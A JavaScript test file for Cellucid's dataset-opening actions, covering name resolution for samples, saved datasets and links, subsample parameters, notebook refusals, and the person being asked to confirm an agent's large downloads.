/**
 * Opening a dataset by the name the person gives (`dataset.open`,
 * `datasets.list`): names resolve to a sample, a dataset of My datasets or a
 * link, and refusals say what there is; opening takes the Open data
 * controls' own paths; a whole-file download is asked about (through the
 * dispatcher's confirmer, for the agent's own opening only); the action is
 * stepless, asks only an agent's action, and is refused from a notebook.
 */
import assert from 'node:assert/strict';
import test from 'node:test';

import { createActionCatalog, defineAction, isSteplessEffect } from '../assets/js/app/actions/catalog.js';
import { ActionRefused, createActionDispatcher } from '../assets/js/app/actions/dispatcher.js';
import { getActionCatalog } from '../assets/js/app/actions/index.js';
import { comparableName, matchByName, resolveDatasetName } from '../assets/js/app/actions/targets/datasets.js';
import { createViewerHostCommandHandlers } from '../assets/js/app/viewer-host/command-handler.js';
import { installDatasetOpenActions, linkProblemOf } from '../assets/js/app/ui/modules/dataset-open-action.js';
import { mcpToolOf } from '../assets/js/app/agent/bridge/mcp-tools.js';
import { catalogDocument } from '../assets/js/app/actions/catalog.js';
import { wholeFileOf } from '../assets/js/data/whole-download.js';
import { resetCellSubsetRequests, takeCellSubsetRequest } from '../assets/js/data/cell-subset-policy.js';
import { cellsToOpenRequestOf } from '../assets/js/app/actions/targets/cells-to-open.js';
import { forgetSeenAddresses, isSeenAddress, noteSeenAddress, noteSeenAddressesIn } from '../assets/js/app/ui/modules/seen-addresses.js';
import { decide, DEFAULT_PERMISSIONS, PERMISSION_MODES, normalizePermissions, permissionsForAgent } from '../assets/js/app/agent/presence/permissions.js';
import { mcpToolsOf } from '../assets/js/app/agent/bridge/mcp-tools.js';

const SAMPLES = Object.freeze([
  { id: 'suo', name: 'Developing human immune system (Suo)', cells: 561947, genes: 5103 },
  { id: 'he', name: 'Developing human lung (He)', cells: 71650, genes: 5152 },
  { id: 'kanemaru', name: 'Developing human heart (Kanemaru)', cells: 131636, genes: 3691 },
  { id: 'pancreas', name: 'Pancreatic endocrinogenesis (scVelo)', cells: 3696, genes: 3753 },
]);

function entry(id, name, source, extra = {}) {
  return {
    id, name, source, link: null, storage: null, cells: 100, genes: 10, openCells: null,
    firstOpenedAt: 1, lastOpenedAt: 2, openCount: 1, ...extra,
  };
}

const MINE = Object.freeze([
  entry('id-lung', 'My lung atlas', { kind: 'link', dataset: 'url:x', locator: 'https://example.org/lung.h5ad' }),
  entry('id-sample-he', 'Developing human lung (He)', { kind: 'sample', dataset: 'he' }),
  entry('id-file', 'retina.h5ad', { kind: 'file', dataset: 'local:retina', name: 'retina.h5ad' }),
]);

const notALink = text => (/^(https?:\/\/|GSE\d+$)/.test(text) ? null : `Cellucid does not recognize "${text}".`);

test('a name is compared without case, spacing or punctuation, exactly first, then by its words', () => {
  assert.equal(comparableName('  Pancreatic   endocrinogenesis (scVelo) '), 'pancreatic endocrinogenesis scvelo');
  const { exact, partial } = matchByName('lung', SAMPLES, sample => [sample.id, sample.name]);
  assert.deepEqual(exact, []);
  assert.deepEqual(partial.map(sample => sample.id), ['he']);
  assert.deepEqual(matchByName('SUO', SAMPLES, sample => [sample.id, sample.name]).exact.map(sample => sample.id), ['suo']);
  assert.deepEqual(matchByName('', SAMPLES, sample => [sample.name]), { exact: [], partial: [] });
});

test('a sample resolves by its id or name; a sample listed in My datasets is the same dataset', () => {
  const where = { kind: 'any', samples: SAMPLES, mine: MINE, linkProblem: notALink };
  assert.equal(resolveDatasetName('pancreas', where).sample.id, 'pancreas');
  assert.equal(resolveDatasetName('Pancreatic endocrinogenesis (scVelo)', where).sample.id, 'pancreas');
  // "Developing human lung (He)" is a sample and, opened before, a My datasets entry: one dataset.
  assert.equal(resolveDatasetName('developing human lung (he)', where).kind, 'sample');
  assert.equal(resolveDatasetName('heart', where).sample.id, 'kanemaru');
  assert.equal(resolveDatasetName('My lung atlas', where).entry.id, 'id-lung');
  assert.equal(resolveDatasetName('retina.h5ad', { ...where, kind: 'my-datasets' }).entry.id, 'id-file');
});

test('a name several datasets match is refused naming them; one nothing matches is tried as a link', () => {
  const where = { kind: 'any', samples: SAMPLES, mine: MINE, linkProblem: notALink };
  assert.throws(() => resolveDatasetName('developing human', where), error => error instanceof ActionRefused
    && error.code === 'unknown-dataset'
    && /names 3 datasets: "Developing human immune system \(Suo\)", "Developing human lung \(He\)" and "Developing human heart \(Kanemaru\)"\. Name one exactly\./.test(error.message));
  // "lung" is a sample's word and a My datasets entry's: both named, and how to choose.
  assert.throws(() => resolveDatasetName('lung', where), /names 2 datasets: .*"Developing human lung \(He\)" and "My lung atlas"\. Name one exactly, or say kind "sample" or "my-datasets"\./);
  assert.deepEqual(resolveDatasetName('GSE123456', where), { kind: 'link', value: 'GSE123456' });
  // A web address is a link whatever names it holds.
  assert.deepEqual(resolveDatasetName('https://example.org/pancreas.h5ad', where), { kind: 'link', value: 'https://example.org/pancreas.h5ad' });
  assert.throws(() => resolveDatasetName('zebrafish', where), error => error.code === 'unknown-dataset'
    && /^There is no dataset "zebrafish": the samples are .*"Pancreatic endocrinogenesis \(scVelo\)"; the person's datasets \(My datasets\) are "My lung atlas" and "retina\.h5ad"; or give a link to a dataset or an accession/.test(error.message));
});

test('a kind narrows where the name is looked for, and says what there is there', () => {
  const where = { samples: SAMPLES, mine: MINE, linkProblem: notALink };
  assert.throws(() => resolveDatasetName('My lung atlas', { ...where, kind: 'sample' }), /There is no sample "My lung atlas": the samples are /);
  assert.throws(() => resolveDatasetName('pancreas', { ...where, kind: 'my-datasets' }), /No dataset in My datasets is called "pancreas": /);
  assert.throws(() => resolveDatasetName('x', { ...where, mine: [], kind: 'my-datasets' }), /My datasets is empty in this browser\.$/);
  assert.throws(() => resolveDatasetName('pancreas', { ...where, kind: 'link' }), /Cellucid does not recognize "pancreas"/);
  assert.deepEqual(resolveDatasetName('GSE1', { ...where, kind: 'link' }), { kind: 'link', value: 'GSE1' });
});

test('the link box decides what is a link: an accession and a web address are, a word is not', () => {
  assert.equal(linkProblemOf('GSE123456'), null);
  assert.equal(linkProblemOf('https://example.org/data.h5ad'), null);
  assert.equal(linkProblemOf('localhost:8765'), null);
  assert.match(linkProblemOf('zebrafish'), /does not recognize "zebrafish"/);
  assert.match(linkProblemOf('localhost:99999'), /is not a port/);
});

test('opening a dataset is stepless, asks only once its cost is known, and is a destructive tool for agents', () => {
  const definition = getActionCatalog().get('dataset.open');
  assert.equal(definition.effect, 'dataset');
  assert.ok(isSteplessEffect('dataset'));
  assert.deepEqual(definition.touches, []);
  assert.equal(definition.confirm, 'large-download');
  assert.equal(definition.confirmAt, 'handler');
  const document = catalogDocument(getActionCatalog());
  const tool = mcpToolOf(document.actions.find(action => action.type === 'dataset.open'));
  assert.equal(tool.name, 'dataset_open');
  assert.deepEqual(tool.annotations, {
    title: 'Open a dataset', readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true,
  });
  // Whether the download is asked is the person's setting, told apart.
  assert.match(tool.description, /Replaces the open dataset, whose history stays kept in this browser \(Undo does not bring it back\); records no step\.$/);
  const list = mcpToolOf(document.actions.find(action => action.type === 'datasets.list'));
  assert.equal(list.annotations.readOnlyHint, true);
  assert.throws(() => defineAction({ ...definition, confirm: null, confirmAt: 'handler' }), /says when to ask \(confirmAt\) but asks about nothing/);
  assert.throws(() => defineAction({ ...definition, confirmAt: 'later' }), /confirmAt must be one of start, handler/);
});

/** A dispatcher over one stepless action that asks from its handler, and one that asks before it runs. */
function askingDispatcher(handler) {
  const catalog = createActionCatalog([
    defineAction({
      type: 'thing.open', title: 'Open a thing', summary: 'Opens a thing.', group: 'Things',
      params: { type: 'object', additionalProperties: false, properties: {} },
      reads: [], effect: 'dataset', confirm: 'large-download', confirmAt: 'handler', result: { type: 'object', additionalProperties: false, properties: {} },
      describe: () => 'Opened a thing', code: () => 'open_thing()',
    }),
    defineAction({
      type: 'thing.read', title: 'Read a thing', summary: 'Reads a thing.', group: 'Things',
      params: { type: 'object', additionalProperties: false, properties: {} },
      reads: [], effect: 'read', result: { type: 'object', additionalProperties: false, properties: {} },
      describe: () => 'Read a thing', code: () => 'read_thing()',
    }),
  ]);
  const dispatcher = createActionDispatcher({ catalog });
  dispatcher.provide('thing.open', handler);
  dispatcher.provide('thing.read', (_params, ctx) => ctx.confirm('never'));
  return dispatcher;
}

test('a handler asks the person through the confirmer with what it costs; only an agent\'s action is asked', async () => {
  const asked = [];
  let answer = true;
  const dispatcher = askingDispatcher(async (_params, { confirm }) => {
    await confirm('It downloads 2 GB.');
    return { opened: true };
  });
  // The confirmer is asked at the start (as of every change of an agent: the
  // person's permissions), then by the handler about what it costs.
  dispatcher.setConfirmer(request => {
    asked.push({ type: request.definition.type, stage: request.stage, confirm: request.confirm, detail: request.detail, agent: request.meta.agent });
    return request.stage === 'start' ? true : answer;
  });
  assert.deepEqual((await dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude' })), { outcome: { opened: true }, step: null, unrecorded: null });
  assert.deepEqual(asked, [
    { type: 'thing.open', stage: 'start', confirm: null, detail: null, agent: 'Claude' },
    { type: 'thing.open', stage: 'handler', confirm: 'large-download', detail: 'It downloads 2 GB.', agent: 'Claude' },
  ]);
  // The person, a notebook, a session: nobody to ask.
  await dispatcher.dispatch('thing.open', {}, { origin: 'user' });
  await dispatcher.dispatch('thing.open', {}, { origin: 'host', host: 'python' });
  assert.equal(asked.length, 2);
  answer = false;
  await assert.rejects(dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'ChatGPT' }),
    error => error instanceof ActionRefused && error.code === 'declined' && error.message === 'The person declined, so this was not done: Open a thing (Opened a thing).');
  // An action whose definition asks nothing cannot ask from its handler.
  await assert.rejects(dispatcher.dispatch('thing.read', {}, { origin: 'agent', agent: 'Claude' }), /asks the person only as its definition says/);
});

test('a notebook does not open datasets in its viewer: the action is refused with what to do instead', async () => {
  const dispatched = [];
  const actions = {
    catalog: getActionCatalog(),
    dispatch: async (...args) => { dispatched.push(args); return { outcome: null, step: null }; },
  };
  for (const [runtime, name, how] of [
    ['jupyter', 'the notebook', /Python shows another dataset with show_anndata\(\) or serve_anndata\(\)\.$/],
    ['cellucid-serve', 'the cellucid serve command', /Python shows another dataset with show_anndata\(\) or serve_anndata\(\)\.$/],
    ['r', 'the R session', /R shows another dataset with cellucid_view\(\)\.$/],
  ]) {
    const { handleAction } = createViewerHostCommandHandlers({
      getShownHostDataset: () => 'served', getHostRuntime: () => runtime, actions,
      loadSession: async () => { throw new Error('No session is loaded here.'); },
    });
    await assert.rejects(handleAction({ action: 'dataset.open', params: { name: 'pancreas' } }),
      error => error.message.startsWith(`"dataset.open" is not carried out from ${name}: this viewer shows the dataset ${name} serves, and `)
        && how.test(error.message));
  }
  assert.equal(dispatched.length, 0);
});

/** The Open data controls, a data source manager, an opening progress and the page's lists, all fake. */
function page({ current = null, mine = MINE, granted = true, kept = true, saved = null } = {}) {
  const calls = [];
  const listeners = new Set();
  let snapshot = null;
  let nextId = 1;
  const opening = {
    snapshot: () => snapshot,
    subscribe(listener) { listeners.add(listener); return () => listeners.delete(listener); },
    cancel() { calls.push(['cancel']); },
    begin(state = 'running') {
      snapshot = { id: `o${nextId++}`, state, summary: null, message: null };
      for (const listener of listeners) listener(snapshot);
      return snapshot;
    },
    end(state, message = null) {
      snapshot = { ...snapshot, state, message };
      for (const listener of listeners) listener(snapshot);
    },
  };
  let shown = current;
  const dataSourceManager = {
    getSource: type => (type === 'local-demo'
      ? { listCatalogEntries: async () => SAMPLES.map(({ id }) => ({ id, name: id })), isAvailable: async () => true,
        listDatasets: async () => SAMPLES.map(sample => ({ id: sample.id, name: sample.name, stats: { n_cells: sample.cells, n_genes: sample.genes } })) }
      : null),
    getCurrentSourceType: () => shown?.sourceType ?? null,
    getCurrentDatasetId: () => shown?.id ?? null,
    getCurrentIdentityId: () => shown?.identity ?? null,
    getCurrentMetadata: () => (shown === null ? null : { name: shown.name, stats: { n_cells: shown.cells, n_genes: 7 } }),
  };
  const show = (sourceType, id, name, identity = id) => { shown = { sourceType, id, name, identity, cells: 50 }; };
  let onOpening = () => true;
  const datasetControls = {
    async openDatasetSource(record) {
      calls.push(['source', record]);
      opening.begin();
      const ok = await onOpening(record);
      if (ok) {
        show(record.kind === 'sample' ? 'local-demo' : record.kind, record.dataset, record.kind === 'sample' ? SAMPLES.find(s => s.id === record.dataset).name : 'opened');
        opening.end('done');
      }
      return ok;
    },
    async openTypedAddress(text) {
      calls.push(['address', text]);
      opening.begin();
      const ok = await onOpening({ kind: 'link', locator: text });
      if (ok) {
        show('link', 'url:x', 'Linked data');
        opening.end('done');
      }
      return { shown: ok, problem: null };
    },
    keptLocalFile: async () => (kept ? { name: 'retina.h5ad', kind: 'file', granted } : null),
    async reopenLocalFile(id) { calls.push(['file', id]); show('local-user', id, 'retina.h5ad', 'id-file'); return true; },
  };
  const state = { get pointCount() { return shown?.cells ?? 0; } };
  const catalog = getActionCatalog();
  const dispatcher = createActionDispatcher({ catalog });
  const remove = installDatasetOpenActions({
    actions: dispatcher, dataSourceManager, state, datasetControls,
    listMine: async () => mine, listSaved: async () => [{ dataset: { id: 'pancreas' } }, { dataset: { id: 'pancreas' }, current: true }],
    opening,
    savedHistories: () => (saved === null ? null : saved({ datasetControls, calls })),
  });
  return { dispatcher, calls, opening, remove, set onOpening(fn) { onOpening = fn; } };
}

test('a sample opens through the sample list\'s own path and answers what is open now', async t => {
  const p = page();
  t.after(p.remove);
  const { outcome, step } = await p.dispatcher.dispatch('dataset.open', { name: 'pancreas' }, { origin: 'agent', agent: 'Claude' });
  assert.equal(step, null);
  assert.deepEqual(p.calls, [['source', { kind: 'sample', dataset: 'pancreas' }]]);
  assert.deepEqual(outcome, {
    name: 'Pancreatic endocrinogenesis (scVelo)', kind: 'sample', cells: 50, total_cells: 50, genes: 7, saved_states: 1, already_open: false,
  });
  // Open already: nothing is opened again, its history goes on.
  const again = await p.dispatcher.dispatch('dataset.open', { name: 'Pancreatic endocrinogenesis (scVelo)' }, { origin: 'agent', agent: 'Claude' });
  assert.equal(again.outcome.already_open, true);
  assert.equal(p.calls.length, 1);
});

test('a dataset of My datasets opens as its menu opens it; a file only where the browser lets the page read it', async t => {
  const p = page();
  await p.dispatcher.dispatch('dataset.open', { name: 'My lung atlas' }, { origin: 'agent', agent: 'Claude' });
  assert.deepEqual(p.calls.at(-1), ['source', MINE[0].source]);
  const opened = await p.dispatcher.dispatch('dataset.open', { name: 'retina.h5ad' }, { origin: 'agent', agent: 'Claude' });
  assert.deepEqual(p.calls.at(-1), ['file', 'local:retina']);
  assert.equal(opened.outcome.kind, 'file');

  p.remove();

  const notGranted = page({ granted: false });
  await assert.rejects(notGranted.dispatcher.dispatch('dataset.open', { name: 'retina.h5ad' }, { origin: 'agent', agent: 'Claude' }),
    error => error.code === 'needs-person' && /which the browser lets only the person open again: ask them to choose it in My datasets\.$/.test(error.message));
  notGranted.remove();
  const gone = page({ kept: false });
  t.after(gone.remove);
  await assert.rejects(gone.dispatcher.dispatch('dataset.open', { name: 'retina.h5ad' }, { origin: 'agent', agent: 'Claude' }),
    error => /that this browser no longer holds: ask them to open it with Session › Open data › Open…\.$/.test(error.message));
  assert.equal(notGranted.calls.length + gone.calls.length, 0);
});

test('a link opens as the address bar opens it; its failure is the opening\'s own sentence', async t => {
  const p = page();
  t.after(p.remove);
  // The person allows the links the agent names (asked: they were not seen in this tab).
  p.dispatcher.setConfirmer(() => true);
  const { outcome } = await p.dispatcher.dispatch('dataset.open', { name: 'GSE123456' }, { origin: 'agent', agent: 'Claude' });
  assert.deepEqual(p.calls, [['address', 'GSE123456']]);
  assert.equal(outcome.kind, 'link');
  p.onOpening = () => {
    p.opening.end('failed', 'The file is not one Cellucid reads.');
    return false;
  };
  await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: 'https://example.org/x.txt' }, { origin: 'agent', agent: 'Claude' }),
    error => error.code === 'failed' && error.message === '"https://example.org/x.txt" could not be opened: The file is not one Cellucid reads.');
  p.onOpening = () => {
    p.opening.end('cancelled');
    return false;
  };
  await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: 'pancreas', kind: 'sample' }, { origin: 'agent', agent: 'Claude' }),
    error => error.code === 'canceled' && /canceled opening "Pancreatic endocrinogenesis \(scVelo\)"; the dataset shown stays\.$/.test(error.message));
});

test('a count or fraction opens that subsample at once, read once, as cells.open takes it; the tab\'s choice stays', async t => {
  resetCellSubsetRequests();
  const p = page();
  t.after(() => { p.remove(); resetCellSubsetRequests(); });
  // What each opening takes as its reader would (`anndata-reader-client.js`).
  const taken = [];
  p.onOpening = () => { taken.push(takeCellSubsetRequest()); return true; };
  const { outcome } = await p.dispatcher.dispatch('dataset.open', { name: 'suo', fraction: 0.1 }, { origin: 'agent', agent: 'Claude' });
  assert.equal(outcome.already_open, false);
  assert.deepEqual(p.calls, [['source', { kind: 'sample', dataset: 'suo' }]]);
  assert.deepEqual(taken, [{ mode: 'subsample', fraction: 0.1, strict: true }]);
  // An exact count with its method; a stratified one with its field; a fraction of 1 is every cell.
  await p.dispatcher.dispatch('dataset.open', { name: 'he', count: 5000, method: 'blocks', seed: 7 }, { origin: 'agent', agent: 'Claude' });
  await p.dispatcher.dispatch('dataset.open', { name: 'My lung atlas', count: 200, method: 'stratified', field: 'cell_type', allocation: 'balanced' }, { origin: 'agent', agent: 'Claude' });
  await p.dispatcher.dispatch('dataset.open', { name: 'heart', fraction: 1 }, { origin: 'agent', agent: 'Claude' });
  assert.deepEqual(taken.slice(1), [
    { mode: 'subsample', method: 'blocks', seed: 7, k: 5000, strict: true },
    { mode: 'subsample', method: 'stratified', field: 'cell_type', allocation: 'balanced', k: 200, strict: true },
    { mode: 'all' },
  ]);
  // Named nothing: the tab's request, which the asked cells never replaced.
  await p.dispatcher.dispatch('dataset.open', { name: 'pancreas' }, { origin: 'agent', agent: 'Claude' });
  assert.deepEqual(taken.at(-1), { mode: 'auto' });
  // The words of the turn and its pseudocode name the share.
  const definition = getActionCatalog().get('dataset.open');
  assert.equal(definition.describe({ name: 'suo', kind: 'any', fraction: 0.1, method: null, seed: null }), 'Opened suo with 10% of the cells');
  assert.equal(definition.code({ name: 'suo', kind: 'any', count: 5000, method: 'blocks', seed: null }), 'open_dataset("suo", count=5000, method="blocks")');
});

test('the cells asked for are checked as cells.open checks them, before anything opens; an open dataset names cells_open', async t => {
  resetCellSubsetRequests();
  const p = page();
  t.after(() => { p.remove(); resetCellSubsetRequests(); });
  const refused = async (params, pattern) => {
    await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: 'suo', ...params }, { origin: 'agent', agent: 'Claude' }),
      error => error.code === 'bad-params' && pattern.test(error.message));
  };
  await refused({ count: 10, fraction: 0.1 }, /^Give how many cells to open as count or as fraction, not both\.$/);
  await refused({ count: 1 }, /^Open at least 2 cells: one cell has no coordinate variation to draw\.$/);
  await refused({ count: 100, method: 'stratified' }, /names the categorical column it is stratified by \(field\)\.$/);
  await refused({ method: 'blocks', seed: 3 }, /^A subsample names how many cells to open \(count, or fraction\) beside its method and seed\.$/);
  assert.deepEqual(p.calls, []);
  // The same sentences refuse cells.open's.
  assert.throws(() => cellsToOpenRequestOf({ count: 1, method: null, seed: null, allocation: 'proportional' }, 100), { message: 'Open at least 2 cells: one cell has no coordinate variation to draw.' });
  assert.deepEqual(cellsToOpenRequestOf({ fraction: 0.25, method: null, seed: null, allocation: 'proportional' }, 100), { mode: 'subsample', k: 25, strict: true });
  assert.deepEqual(cellsToOpenRequestOf({ count: 100, method: null, seed: null, allocation: 'proportional' }, 100), { mode: 'all' });
  await p.dispatcher.dispatch('dataset.open', { name: 'pancreas' }, { origin: 'agent', agent: 'Claude' });
  await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: 'pancreas', fraction: 0.5 }, { origin: 'agent', agent: 'Claude' }),
    error => error.code === 'already-open' && error.message === '"Pancreatic endocrinogenesis (scVelo)" is open already: cells_open reads it again with other cells.');
  // Open already and asked for nothing more: its history goes on.
  assert.equal((await p.dispatcher.dispatch('dataset.open', { name: 'pancreas' }, { origin: 'agent', agent: 'Claude' })).outcome.already_open, true);
});

test('a whole-file download of the agent\'s own opening is asked about with its size; declined, nothing opens', async t => {
  const p = page();
  t.after(p.remove);
  const asked = [];
  let yes = true;
  // Asked about the download by the opening itself (the start's question is the person's permissions).
  p.dispatcher.setConfirmer(({ detail, stage, confirm }) => {
    // The start's question is the person's permissions; the link, not seen in this tab, is allowed.
    if (stage === 'start' || confirm === 'unseen-link') return true;
    asked.push(detail);
    return yes;
  });
  const resource = { url: 'https://slow.example/data.h5ad', name: 'data.h5ad', size: 2_500_000_000, identity: null };
  p.onOpening = async () => {
    // The link source reaches the whole download (`whole-download.js`) during this opening.
    try {
      await wholeFileOf(resource, { opening: { step() {}, notice() {} }, signal: AbortSignal.abort() });
    } catch (error) {
      if (error?.name === 'AbortError' && error.kind === 'user') return false;
    }
    return true;
  };
  await p.dispatcher.dispatch('dataset.open', { name: 'https://slow.example/data.h5ad' }, { origin: 'agent', agent: 'Claude' }).catch(() => {});
  assert.equal(asked.length, 1);
  assert.match(asked[0], /^It downloads the whole file data\.h5ad \(2\.3 GB\) into this browser: slow\.example does not serve parts of files\.$/);
  yes = false;
  await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: 'https://slow.example/data.h5ad' }, { origin: 'agent', agent: 'Claude' }),
    error => error.code === 'declined' && error.message === 'The person declined the download, so "https://slow.example/data.h5ad" was not opened.');
  // An opening someone else started is never asked about.
  asked.length = 0;
  p.opening.begin();
  await wholeFileOf(resource, { opening: { step() {}, notice() {} }, signal: AbortSignal.abort() }).catch(() => {});
  assert.equal(asked.length, 0);
});

test('the datasets to open: the samples, My datasets with what an agent can open, and the one open now', async t => {
  const p = page({ granted: false, current: { sourceType: 'local-demo', id: 'he', name: 'Developing human lung (He)', identity: 'he', cells: 9 } });
  t.after(p.remove);
  const { outcome } = await p.dispatcher.dispatch('datasets.list', {}, { origin: 'agent', agent: 'Claude' });
  assert.deepEqual(outcome.open, { name: 'Developing human lung (He)', kind: 'sample' });
  assert.deepEqual(outcome.samples[3], { id: 'pancreas', name: 'Pancreatic endocrinogenesis (scVelo)', cells: 3696, genes: 3753 });
  assert.deepEqual(outcome.my_datasets.map(each => [each.name, each.kind, each.agent_can_open]), [
    ['My lung atlas', 'link', true], ['Developing human lung (He)', 'sample', true], ['retina.h5ad', 'file', false],
  ]);
  assert.equal(outcome.my_datasets[0].last_opened, new Date(2).toISOString());
});

test('an agent\'s action names its connection; the person being asked is heard by whoever waits on the call', async () => {
  const dispatcher = askingDispatcher(async (_params, { confirm, meta }) => {
    await confirm('It downloads 2 GB.');
    return { connection: meta.connection };
  });
  const events = [];
  dispatcher.subscribe(event => { if (event.kind === 'asking' || event.kind === 'answered') events.push(event); });
  let answer = true;
  // A confirmer that lets the change start and asks the person about the cost (`asking`).
  dispatcher.setConfirmer(({ stage, asking }) => {
    if (stage === 'start') return true;
    asking();
    return answer;
  });
  const connection = { id: 'g1', kind: 'connector', client: 'Claude Code', host: 'claude.ai', known: true };
  const { outcome } = await dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude', connection });
  assert.deepEqual(outcome.connection, connection);
  assert.deepEqual(events.map(event => [event.kind, event.detail ?? null, event.allowed ?? null, event.meta.connection.id]), [
    ['asking', 'It downloads 2 GB.', null, 'g1'], ['answered', null, true, 'g1'],
  ]);
  answer = false;
  await assert.rejects(dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude', connection }), /declined/);
  assert.equal(events.at(-1).allowed, false);
  // A person's, a notebook's action names no connection; an agent's names a real one.
  assert.equal((await dispatcher.dispatch('thing.open', {}, { origin: 'user', connection })).outcome.connection, null);
  await assert.rejects(dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude', connection: { id: '', kind: 'connector' } }), /names its id and kind/);
  await assert.rejects(dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude', connection: { id: 'g', kind: 'email' } }), /names its id and kind/);
});

// --- history.saved.open: Load…'s Open as an action ---------------------

const STATES = Object.freeze([
  { id: 'state-he', kind: 'autosave', name: null, lastStep: 'Colored by gene SFTPC', dataset: { id: 'he', name: 'Developing human lung (He)' }, steps: 12, openable: true },
  { id: 'state-shown', kind: 'autosave', name: null, lastStep: null, dataset: { id: 'pancreas', name: 'Pancreatic endocrinogenesis (scVelo)' }, steps: 3, openable: true, current: true },
  { id: 'state-old', kind: 'named', name: 'Old work', lastStep: null, dataset: { id: 'he', name: 'Developing human lung (He)' }, steps: 4, openable: false },
]);

/** Saved states whose Open opens the He sample (its dataset first), then answers `outcome`. */
function savedStates(outcome = { opened: true, problem: null, code: null }, opened = []) {
  return ({ datasetControls }) => ({
    list: async () => STATES,
    async open(id) {
      opened.push(id);
      if (!await datasetControls.openDatasetSource({ kind: 'sample', dataset: 'he' })) return { opened: false, problem: null, code: null };
      return outcome;
    },
  });
}

const AGENT = Object.freeze({ origin: 'agent', agent: 'Claude' });
const PANCREAS_SHOWN = Object.freeze({ sourceType: 'local-demo', id: 'pancreas', name: 'Pancreatic endocrinogenesis (scVelo)', identity: 'pancreas', cells: 9 });

test('opening a saved state is Load\'s Open as a stepless dataset action, asked only for a large download, refused from a notebook', async () => {
  const definition = getActionCatalog().get('history.saved.open');
  assert.equal(definition.effect, 'dataset');
  assert.equal(definition.confirm, 'large-download');
  assert.equal(definition.confirmAt, 'handler');
  assert.deepEqual(definition.touches, []);
  const tool = mcpToolOf(catalogDocument(getActionCatalog()).actions.find(action => action.type === 'history.saved.open'));
  assert.equal(tool.name, 'history_saved_open');
  assert.match(tool.description, /to continue it, as Load…'s Open does: its dataset first when another is shown .*use history_replay\./);
  const dispatched = [];
  const { handleAction } = createViewerHostCommandHandlers({
    getShownHostDataset: () => 'served', getHostRuntime: () => 'jupyter',
    actions: { catalog: getActionCatalog(), dispatch: async (...args) => { dispatched.push(args); return { outcome: null, step: null }; } },
    loadSession: async () => { throw new Error('No session is loaded here.'); },
  });
  await assert.rejects(handleAction({ action: 'history.saved.open', params: { saved: 'state-he' } }),
    error => /^"history\.saved\.open" is not carried out from the notebook/.test(error.message));
  assert.equal(dispatched.length, 0);
});

test('a saved state of another dataset opens its dataset first, then its history, and says so', async t => {
  const opened = [];
  const p = page({ current: PANCREAS_SHOWN, saved: savedStates(undefined, opened) });
  t.after(p.remove);
  const { outcome, step } = await p.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT);
  assert.equal(step, null);
  assert.deepEqual(opened, ['state-he']);
  assert.deepEqual(p.calls, [['source', { kind: 'sample', dataset: 'he' }]]);
  assert.deepEqual(outcome, {
    saved: 'state-he', name: null, dataset: 'Developing human lung (He)', steps: 12, dataset_opened: true, already_shown: false,
    not_restored: null,
  });
});

test('a saved state opened but for a part tells the agent which part, in the words the person was told', async t => {
  const said = 'Session restored but for 1 part. Expression values could not be restored: it was saved by an earlier version of Cellucid (0.9.7), and this version cannot read this part. It is left as it was shown.';
  const p = page({ current: PANCREAS_SHOWN, saved: savedStates({ opened: true, problem: null, code: null, notRestored: said }) });
  t.after(p.remove);
  const { outcome } = await p.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT);
  assert.equal(outcome.not_restored, said);
});

test('the history shown goes on; an unknown or unopenable saved state is refused before anything opens', async t => {
  const opened = [];
  const p = page({ current: PANCREAS_SHOWN, saved: savedStates(undefined, opened) });
  const { outcome } = await p.dispatcher.dispatch('history.saved.open', { saved: 'state-shown' }, AGENT);
  assert.deepEqual(outcome, {
    saved: 'state-shown', name: null, dataset: 'Pancreatic endocrinogenesis (scVelo)', steps: 3, dataset_opened: false, already_shown: true,
    not_restored: null,
  });
  await assert.rejects(p.dispatcher.dispatch('history.saved.open', { saved: 'state-9' }, AGENT),
    error => error.code === 'no-target'
      && error.message === 'No saved state of this browser has the id "state-9"; the saved states are "state-he", "state-shown", "state-old" (history_saved_list).');
  await assert.rejects(p.dispatcher.dispatch('history.saved.open', { saved: 'state-old' }, AGENT),
    error => error.code === 'unopenable' && error.message === '"Old work" was kept by another version of Cellucid, which this version cannot open or replay.');
  assert.deepEqual(opened, []);
  p.remove();
  const none = page({ saved: () => null });
  t.after(none.remove);
  await assert.rejects(none.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT), error => error.code === 'unavailable');
});

test('a saved state not opened is refused with why: the person to reopen its file, its load\'s failure, its opening\'s', async t => {
  const reopen = page({ current: PANCREAS_SHOWN, saved: savedStates({
    opened: false, code: 'needs-person',
    problem: 'It was saved on "retina.h5ad", opened from this computer, which the browser lets only the person read again: the page now offers them "Reopen retina.h5ad", after which it opens.',
  }) });
  await assert.rejects(reopen.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT),
    error => error.code === 'needs-person'
      && /^The autosave at "Colored by gene SFTPC" was not opened\. It was saved on "retina\.h5ad", .*"Reopen retina\.h5ad", after which it opens\.$/.test(error.message));
  reopen.remove();
  const failed = page({ current: PANCREAS_SHOWN, saved: savedStates({ opened: false, code: 'failed', problem: 'The file is damaged, so it was not opened; the history shown is unchanged.' }) });
  await assert.rejects(failed.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT),
    error => error.code === 'failed' && /was not opened\. The file is damaged/.test(error.message));
  failed.remove();
  // Its dataset could not be read: said by its opening, as dataset.open says it.
  const unread = page({ current: PANCREAS_SHOWN, saved: savedStates() });
  unread.onOpening = async () => { unread.opening.end('failed', 'the host answered 500'); return false; };
  await assert.rejects(unread.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT),
    error => error.code === 'failed' && error.message === 'The autosave at "Colored by gene SFTPC" could not be opened: the host answered 500');
  unread.remove();
});

